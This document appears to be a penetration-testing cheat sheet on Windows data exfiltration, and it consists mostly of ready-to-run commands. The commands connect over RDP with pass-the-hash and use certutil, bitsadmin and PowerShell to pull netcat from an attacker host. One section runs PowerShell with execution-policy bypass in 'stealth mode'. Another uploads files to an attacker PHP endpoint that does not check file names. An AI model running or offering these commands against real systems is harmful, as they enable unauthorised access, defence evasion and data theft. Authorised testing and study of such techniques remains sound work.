# Windows Data Exfiltration

* Use Remote Desktop Session using xfreerdp3 with +clipboard
* Use kali linux NC windows binary
* Locate file transfer utilities on Windows systems
* File copy to/from anonymous samba share with copy
* Download a file using certutil
* Download a file using bitsadmin
* Download a file with PowerShell
* Upload a file with PowerShell

## FreeRDP - A Free Remote Desktop Protocol

* +clipboard
* +auto-reconnect
* /cert:ignore
* /dynamic-resolution
* /v: server
* /pth: pass-the hash NTLM
* /list-kbd show avaliable keyboards

```bash

xfreerdp3 +clipboard +auto-reconnect /u:DOMAIN\\user /p:password /v:remote-ip
xfreerdp3 /list:kbd

# RDP User/Password
xfreerdp3 /u:user /v:ip /p:password /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
# RDP NTLM Pass-the-hash 
xfreerdp3 /u:user /v:ip /pth:hidden /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
 
```

## Use Kali Linux NC windows-binary

```bash
sudo apt install windows-binaries
ll /usr/share/windows-binaries/
windows-binaries -h
```

```bash
sudo cp /usr/share/windows-binaries/nc.exe /var/www/html/
```

## Window file copy to and from anonymous samba share

```shells
# upload and download
copy .\path\to\file \\REMOTE-IP\share\upload
copy \\REMOTE-IP\share\download copy .\path\to\file
```

## Download a file using certutil

* We can also use this to download remote files.
* But: Certutil is blocked by Windows Security Antivirus rules.
* -urlcache
* -f file url

```powershell
C:\Users\user> cd Downloads
certutil -urlcache -split -f http://kali-ip/nc.exe nc.exe
```

## Downlaod a file using bitsadmin

```powershell
bitsadmin /create DownloadJob
bitsadmin /addfile DownloadJob http://kali-ip/nc.exe C:\Users\user\Downloads\nc.exe
bitsadmin /resume DownloadJob
bitsadmin /complete DownloadJob
bitsadmin /info DownloadJob /verbose
```

## Downlaod a file using powershell

```powershell
(New-Object Net.WebClient).DownloadFile('http://remote-ip/nc.exe', 'nc.exe')

wget http://remote-ip/nc.exe -o nc.exe

Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe'
Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe' -proxy "http://proxy.contoso.com:8080
```

## Downlaod a file using powershell script with stealth mode

* Bypass security policy and default profiel
* -ExecutionPolicy Bypass
* -NoProfile

* Stealth mode
* -NonInteractive
* -NoLogo

```powershell
type .\wget.ps1
$webclient = New-Object System.Net.WebClient
$url = "http://remote-ip/nc.exe"
$dst = "nc.exe"
$webclient.DownloadFile($url,$dst)

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File .\wget.ps1
```

## Upload File with powershell

* '$' must be escaped in bash scripts
* \$

```bash
cat psupload.php
<?php 
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
    echo "Upload done.";
else
    echo "Upload error!";
?>
```

```powershell
powershell $response=(New-Object Net.WebClient).UploadFile('http://remote-ip/psupload.php', '.\Upload.txt'); [Text.Encoding]::UTF8.GetString($response)
```
